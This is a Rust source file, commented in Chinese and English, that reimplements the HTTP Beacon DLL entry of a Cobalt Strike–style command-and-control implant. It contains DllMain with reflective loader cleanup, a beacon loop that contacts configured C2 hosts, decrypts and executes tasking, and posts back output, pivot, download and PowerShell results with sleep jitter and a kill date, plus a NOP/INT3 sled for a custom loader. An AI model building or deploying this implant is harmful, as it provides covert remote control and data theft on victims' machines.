//! 标准 HTTP Beacon DLL 入口（对应 beacon.cpp + ReflectiveDll.cpp）。
//! Standard HTTP Beacon DLL entry (mirrors beacon.cpp + ReflectiveDll.cpp).

//! `adjust`/`length` 循环变量与 `shell_callback` 镜像严格遵循 C++ 入口点。
//! The `adjust`/`length` loop variables and `shell_callback`
//! mirrors follow the C++ entry points verbatim.
#![allow(unused_assignments)]
#![allow(dead_code)]

use beacon_core::beacon::{SETTING_C2_CHUNK_POST, SETTING_DOMAINS, SETTING_DNS_IDLE, SETTING_JITTER, SETTING_MAXGET, SETTING_PORT, SETTING_PROTOCOL, SETTING_SLEEPTIME, SETTING_SUBMITURI, SETTING_USERAGENT, BEACON_PROTO_HTTPS};
use beacon_core::callback::{command_shell_callback, command_shell_chunk_maybe, command_shell_encrypt, register_command_shell_post};
use beacon_core::channel::{http_close, http_get, http_init, http_post_maybe, http_put};
use beacon_core::commands::{bad_watermark, bad_watermark_hash, check_kill_date, command_die, POST_HTTP};
use beacon_core::jobs::psh_poll;
use beacon_core::metadata::agent_init;
use beacon_core::parse::DataP;
use beacon_core::link::link_poll;
use beacon_core::proto::process_payload;
use beacon_core::security::security_decrypt;
use beacon_core::settings::{setting_int, setting_ptr, setting_short, settings_init};
use beacon_core::state;
use beacon_core::strategy::{check_max_retry, next_host, strategy_setup, StrategyInfo};
use beacon_core::thread::safe_exit;
use beacon_core::gargle::gargle_sleep;
use beacon_core::pivot::pivot_poll;
use beacon_core::files::download_poll;

const DLL_METASPLOIT_ATTACH: u32 = 0x04;

/// 通过 HTTP 发送加密并封装好的响应（command_shell_post）。
/// Sends an encrypted+packaged response via HTTP (command_shell_post).
fn shell_post(buffer: &[u8], length: usize, type_: i32, send_now: bool) {
    let Some(cipherdata) = command_shell_encrypt(buffer, length, type_) else {
        return;
    };
    // 只有 HTTP 发送支持响应队列；如需则绕过队列。
    // only HTTP posting supports a response queue; bypass it if required
    if state::post_type() == POST_HTTP {
        http_put(&state::POST_URL.lock().clone(), &cipherdata, cipherdata.len(), send_now);
    }
}

fn shell_callback(buffer: &[u8], length: i32, type_: i32) {
    let should_chunk = setting_int(SETTING_C2_CHUNK_POST) > 0;
    // 与分块阈值比较；仅 HTTP POST 时进行分块。
    // compare with the chunk threshold; chunk only for HTTP POST
    if state::post_type() == POST_HTTP && should_chunk {
        command_shell_chunk_maybe(buffer, length as usize, type_);
    } else {
        shell_post(buffer, length as usize, type_, false);
    }
}

/// Beacon 主循环（beacon.cpp 中的 `beacon`）。
/// The Beacon main loop (beacon.cpp `beacon`).
fn beacon_loop(_lp_reserved: *mut core::ffi::c_void) {
    let _blob = DataP::alloc(256 + 128);
    let mut url = vec![0u8; 256];
    let mut beacon_domain = vec![0u8; 128];
    let mut adjust: u32 = 0;
    let mut failed_host = false;

    // 我们的各种设置
    // our various settings
    let hosts = setting_ptr(SETTING_DOMAINS).unwrap_or(b"").to_vec();
    let dns = setting_short(SETTING_PROTOCOL) & !BEACON_PROTO_HTTPS;
    let port = setting_short(SETTING_PORT);
    let sleep_time_setting = setting_int(SETTING_SLEEPTIME);
    let dnsidle = setting_int(SETTING_DNS_IDLE);
    let ua = setting_ptr(SETTING_USERAGENT).unwrap_or(b"").to_vec();
    let submit = setting_ptr(SETTING_SUBMITURI).unwrap_or(b"").to_vec();

    // 跟踪最大重试策略状态
    // track max retry strategy state
    let mut max_retry_count: i32 = 0;
    let mut max_orig_sleep_time: u32 = 0;

    let mut strategy_info = StrategyInfo {
        strategy: 0,
        rotation_timer: 0,
        failover_timer: 0,
        failover_maxfail: 0,
    };
    strategy_setup(
        &mut strategy_info,
        setting_short(beacon_core::beacon::SETTING_DOMAIN_STRATEGY) as i32,
        setting_int(beacon_core::beacon::SETTING_DOMAIN_STRATEGY_SECONDS) as i32,
        setting_int(beacon_core::beacon::SETTING_DOMAIN_STRATEGY_FAIL_SECONDS) as i32,
        setting_int(beacon_core::beacon::SETTING_DOMAIN_STRATEGY_FAIL_X) as i32,
    );

    // 检查终止日期 + 水印
    // check the kill date + watermark
    if check_kill_date() || bad_watermark() || bad_watermark_hash() {
        safe_exit();
        return;
    }

    // 设置我们的睡眠时间 + 抖动
    // set our sleep time + jitter
    state::set_sleep_time(sleep_time_setting);
    state::set_jitter(setting_short(SETTING_JITTER) as u32);

    // 分配我们的缓冲区（在 process_payload 中被清零）
    // allocate our buffer (cleared in process_payload)
    let mut buffer = vec![0u8; setting_int(SETTING_MAXGET) as usize];

    // 初始化 agent
    // initialize the agent
    let buffer_len = buffer.len();
    agent_init(&mut buffer, buffer_len);

    while state::sleep_time() > 0 {
        // 根据主机轮换策略构建 beacon 域名 + url
        // build the beacon domain + url from the host rotation strategy
        if let Some(h) = next_host(&hosts, failed_host, &strategy_info) {
            let n = h.len().min(127);
            beacon_domain[..n].copy_from_slice(&h[..n]);
            beacon_domain[n] = 0;
        }
        failed_host = false;
        if let Some(h) = next_host(&hosts, failed_host, &strategy_info) {
            let n = h.len().min(255);
            url[..n].copy_from_slice(&h[..n]);
            url[n] = 0;
        }

        // 输出使用 HTTP
        // use HTTP for output
        state::set_post_type(POST_HTTP);
        let _ = dns;
        let _ = dnsidle;

        // 创建 URL
        // create the URL
        {
            let mut post_url = state::POST_URL.lock();
            post_url.clear();
            post_url.extend_from_slice(&submit);
        }

        // 执行协议的 HTTP 部分
        // execute the HTTP part of the protocol
        let host_end = beacon_domain.iter().position(|&c| c == 0).unwrap_or(beacon_domain.len());
        http_init(&beacon_domain[..host_end], port, &ua);

        let url_end = url.iter().position(|&c| c == 0).unwrap_or(url.len());
        let buffer_len = buffer.len();
        let mut length = {
            let bs = state::BIGSESSION.lock();
            http_get(&url[..url_end], &bs, &mut buffer, buffer_len)
        };

        // 在处理 payload 之前先解密并校验
        // decrypt and verify the payload before processing it
        if length > 0 {
            length = security_decrypt(&mut buffer, length as usize);
            if length > 0 {
                process_payload(&mut buffer, length as usize);
            } else {
                length = -1;
                failed_host = true;
            }
        }

        // 如果没有失败，则执行 POST
        // if there's no failure, do the POST
        if length != -1 {
            // 检查我们的 pivots 是否有数据要上报
            // check our pivots for data to report
            pivot_poll(command_shell_callback);

            // 通过 HTTP GET 推送数据时限制下载速度
            // limit download speed when pushing data via HTTP GET
            let max_packet = if setting_int(SETTING_C2_CHUNK_POST) == 0 {
                beacon_core::commands::MAX_PACKET
            } else {
                beacon_core::commands::MAX_PACKET_DNS
            };
            download_poll(command_shell_callback, max_packet);

            // 上报所有 links
            // report all links
            link_poll(command_shell_callback);

            // 检查我们的 powershell 实例
            // check our powershell instances
            psh_poll(command_shell_callback, beacon_core::commands::MAX_PACKET);

            // 检查终止日期
            // check the kill date
            if check_kill_date() {
                command_die(command_shell_callback);
            }

            // 如果有任何要发送的数据，现在立即发送 —— 一次性
            // if there's anything to send, do it now -- one-shot
            if state::http_post_len() > 0 {
                // 使用新的 HTTP 连接
                // use a new HTTP connection
                http_close();
                let host_end = beacon_domain.iter().position(|&c| c == 0).unwrap_or(beacon_domain.len());
                http_init(&beacon_domain[..host_end], port, &ua);
                let post_url = state::POST_URL.lock().clone();
                http_post_maybe(&post_url);
            }
        } else {
            failed_host = true;
        }

        http_close();

        // 再次检查终止日期
        // check the kill date (again)
        if check_kill_date() {
            safe_exit();
            return;
        }

        // 检查最大重试策略
        // check the max retry strategy
        let mut sleep_time = state::sleep_time();
        if check_max_retry(failed_host, &mut max_retry_count, &mut sleep_time, &mut max_orig_sleep_time) {
            safe_exit();
            return;
        }
        state::set_sleep_time(sleep_time);

        // 我们需要睡多久？
        // how long do we need to sleep?
        let sleep_time = state::sleep_time();
        if sleep_time > 0 {
            let j = state::jitter();
            if j == 0 {
                gargle_sleep(sleep_time);
            } else {
                let sxjd100 = (sleep_time * j) / 100;
                adjust = if sxjd100 > 0 { beacon_core::beacon::bigger_rand() % sxjd100 } else { 0 };
                if adjust < sleep_time {
                    gargle_sleep(sleep_time - adjust);
                } else {
                    gargle_sleep(sleep_time);
                }
            }
        }
    }

    // 我们退出进程——以免宿主进程"崩溃"
    // we exit the process--to keep the process we live in from "crashing"
    safe_exit();
}

/// DllMain（ReflectiveDll.cpp）。
/// DllMain (ReflectiveDll.cpp).
#[no_mangle]
pub unsafe extern "system" fn DllMain(
    hinst_dll: windows_sys::Win32::Foundation::HINSTANCE,
    dw_reason: u32,
    lp_reserved: *mut core::ffi::c_void,
) -> i32 {
    match dw_reason {
        // DLL_QUERY_HMODULE
        6 => {}
        // DLL_PROCESS_ATTACH
        1 => {
            // 初始化我们的设置数据
            // initialize our settings data
            settings_init(hinst_dll as usize);
        }
        // DLL_METASPLOIT_ATTACH
        DLL_METASPLOIT_ATTACH => {
            // 清理我们的加载器
            // clean up our loader
            if setting_short(beacon_core::beacon::SETTING_CLEANUP) == 1 && !hinst_dll.is_null() {
                let mut mbi: windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION =
                    std::mem::zeroed();
                if windows_sys::Win32::System::Memory::VirtualQuery(
                    hinst_dll as *const _,
                    &mut mbi,
                    std::mem::size_of::<windows_sys::Win32::System::Memory::MEMORY_BASIC_INFORMATION>(),
                ) != 0
                {
                    if mbi.Type == windows_sys::Win32::System::Memory::MEM_PRIVATE {
                        windows_sys::Win32::System::Memory::VirtualFree(
                            hinst_dll as *mut _,
                            0,
                            windows_sys::Win32::System::Memory::MEM_RELEASE,
                        );
                    } else if mbi.Type == windows_sys::Win32::System::Memory::MEM_MAPPED {
                        windows_sys::Win32::System::Memory::UnmapViewOfFile(windows_sys::Win32::System::Memory::MEMORY_MAPPED_VIEW_ADDRESS { Value: hinst_dll as *mut _ });
                    }
                }
            }

            // 注册我们的 post 实现 + 启动 beacon
            // register our post implementation + start the beacon
            register_command_shell_post(shell_post);
            beacon_loop(lp_reserved);
        }
        _ => {}
    }
    return 1;
}

/// ReflectiveLoader 入口 —— UDRL 覆盖的 sled（INT3/NOP 填充）。
/// ReflectiveLoader entry — the sled (INT3/NOP filler) the UDRL overwrites.
/// 大小与 ReflectiveLoader.5k 一致（`__debugbreak(); __nop()*7` 共 5120 字节）。
/// Size matches ReflectiveLoader.5k (5120 bytes of `__debugbreak(); __nop()*7`).
#[no_mangle]
pub static ReflectiveLoader: [u8; 5120] = build_sled();

const fn build_sled() -> [u8; 5120] {
    let mut sled = [0u8; 5120];
    let mut i = 0;
    while i < 5120 {
        // __debugbreak() = INT3 (0xCC)；__nop() = NOP (0x90)
        // __debugbreak() = INT3 (0xCC); __nop() = NOP (0x90)
        sled[i] = 0xCC;
        let mut j = 1;
        while j < 8 && i + j < 5120 {
            sled[i + j] = 0x90;
            j += 1;
        }
        i += 8;
    }
    sled
}
